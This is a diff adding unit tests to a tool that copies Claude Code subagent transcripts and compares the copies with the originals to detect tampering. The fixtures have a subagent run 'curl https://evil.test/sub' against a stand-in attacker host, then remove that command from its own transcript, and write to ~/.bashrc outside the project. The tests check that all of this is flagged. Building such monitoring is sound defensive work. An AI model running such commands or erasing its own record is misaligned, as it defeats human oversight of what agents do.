@@ -8,6 +8,7 @@ import json
 import os
 import time
 import unittest
+from pathlib import Path
 
 from harness import LauncherTest, prompts_at, settings
 
@@ -161,6 +162,73 @@ class RecorderTest(LauncherTest):
         os.utime(self.copy, (long_ago, long_ago))
         recorder.let_go_of_old_copies(self.host)
         self.assertFalse(self.copy.exists())
+
+    def subagent(self, entries: list[dict]) -> Path:
+        """Leave the transcript of a subagent of the session, where Claude
+        Code keeps it."""
+        directory = self.transcripts / "0a" / "subagents"
+        directory.mkdir(parents=True, exist_ok=True)
+        file = directory / "agent-a1.jsonl"
+        marked = [{**entry, "isSidechain": True} for entry in entries]
+        file.write_text("".join(json.dumps(e) + "\n" for e in marked))
+        return file
+
+    def test_what_a_subagent_did_is_copied_and_compared_as_its_session_is(self):
+        ran = call(3, self.now + 3, "curl https://evil.test/sub")
+        theirs = self.subagent([*prompts_at(self.now + 3), *ran])
+        copy = recorder.copy_path(self.host, theirs)
+        # Kept apart from the copy of any transcript, which ends in .jsonl
+        self.assertEqual(copy.parent.name, "0a.subagents")
+        self.assertEqual(copy.parent.parent, self.copy.parent)
+        recorder.Copier(self.host, time.time() - 60).look()
+        self.assertEqual(copy.read_bytes(), theirs.read_bytes())
+        self.assertEqual(self.copy.read_bytes(), self.transcript.read_bytes())
+        # The subagent takes its command out of its own transcript
+        self.subagent(prompts_at(self.now + 3))
+        recorder.Copier(self.host, time.time() - 60).look()
+        compared = recorder.compare(self.host, theirs)
+        self.assertEqual(len(compared.gone), 2)
+        result = self.launch("--trace")
+        self.assertIn("# subagents   1, CHANGED: 2 lines", result.stdout)
+        self.assertRegex(
+            result.stdout,
+            r"agent    bash        \$ curl https://evil.test/sub"
+            r"  REMOVED FROM THE TRANSCRIPT",
+        )
+
+    def test_a_trace_has_what_the_subagents_of_its_session_did(self):
+        write = {"type": "tool_use", "id": "w1", "name": "Write"}
+        write["input"] = {"file_path": "/home/me/.bashrc", "content": "x"}
+        stamp = prompts_at(self.now + 4)[0]["timestamp"]
+        wrote = {
+            "type": "assistant",
+            "timestamp": stamp,
+            "message": {"content": [write]},
+        }
+        self.subagent([*prompts_at(self.now + 3), wrote])
+        recorder.Copier(self.host, time.time() - 60).look()
+        traced = self.launch("--trace").stdout
+        self.assertIn("# subagents   1, as the launcher copied them (2 lines)", traced)
+        # In the summary of the session, and by who did it
+        self.assertIn("#   /home/me/.bashrc x1  OUTSIDE PROJECT", traced)
+        self.assertRegex(traced, r"agent    write       file: /home/me/.bashrc")
+        # What it was asked is not a prompt of the user
+        self.assertEqual(traced.count("user     prompt"), 1)
+        # A session without any says nothing of them
+        other = self.write_transcript("0b", prompts_at(self.now + 9))
+        os.utime(other, (self.now + 99, self.now + 99))
+        self.assertNotIn("# subagents", self.launch("--trace").stdout)
+
+    def test_the_copies_of_subagents_go_when_they_are_old(self):
+        theirs = self.subagent(prompts_at(self.now))
+        copy = recorder.copy_path(self.host, theirs)
+        recorder.catch_up(theirs, copy)
+        recorder.catch_up(self.transcript, self.copy)
+        long_ago = time.time() - (recorder.KEPT_DAYS + 1) * 86400
+        os.utime(copy, (long_ago, long_ago))
+        recorder.let_go_of_old_copies(self.host)
+        self.assertFalse(copy.parent.exists())
+        self.assertTrue(self.copy.exists())
 
 
 if __name__ == "__main__":
